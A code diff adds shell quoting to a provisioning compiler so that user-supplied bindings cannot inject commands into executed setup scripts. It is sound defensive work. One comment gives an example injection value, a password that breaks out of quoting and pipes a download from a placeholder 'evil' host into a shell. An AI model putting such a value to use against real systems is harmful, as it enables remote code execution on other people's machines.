@@ -33,12 +33,37 @@ export function checkBindings(bp: Blueprint, b: Bindings): { ok: boolean; missin
   return { ok: !missing.inputs.length && !missing.seeds.length && !missing.repos.length, missing };
 }
 
+/**
+ * POSIX single-quote escaping. A value reaching a shell must survive anything a user
+ * typed into an input field: a password of `x'; curl evil | sh; '` is otherwise a
+ * remote shell on the project's machine.
+ */
+export function shellQuote(value: string): string {
+  return "'" + value.replace(/'/g, `'\\''`) + "'";
+}
+
 /** Substitute ${input.X} / ${seed.X} / ${repo.X} against the bindings. */
 export function interpolate(value: string, bp: Blueprint, b: Bindings): string {
   return value.replace(/\$\{(input|seed|repo)\.([A-Za-z][A-Za-z0-9_-]*)\}/g, (_m, kind, name) => {
     if (kind === "input") return b.inputs[name] ?? bp.inputs.find((i) => i.key === name)?.default ?? "";
     if (kind === "seed") return b.seeds[name] ?? "";
     return (b.repos[name] ?? []).join(",");
+  });
+}
+
+/**
+ * Interpolate into a context that is executed by a shell. Every substituted value is
+ * quoted, so a binding can never add a command.
+ */
+export function interpolateShell(value: string, bp: Blueprint, b: Bindings): string {
+  return value.replace(/\$\{(input|seed|repo)\.([A-Za-z][A-Za-z0-9_-]*)\}/g, (_m, kind, name) => {
+    const raw =
+      kind === "input"
+        ? (b.inputs[name] ?? bp.inputs.find((i) => i.key === name)?.default ?? "")
+        : kind === "seed"
+          ? (b.seeds[name] ?? "")
+          : (b.repos[name] ?? []).join(",");
+    return shellQuote(raw);
   });
 }
 
@@ -170,7 +195,8 @@ export function compileProvisioning(bp: Blueprint, b: Bindings): Graph {
     nodes.push({
       id: `setup-${step.id}`,
       type: "provision.run-step",
-      config: { step },
+      // The script is executed by a shell, so every binding is quoted on the way in.
+      config: { step: { ...step, script: interpolateShell(step.script, bp, b) } },
       input: { sandboxId: "$.nodes.acquire.sandboxId" },
     });
     link(`setup-${step.id}`);
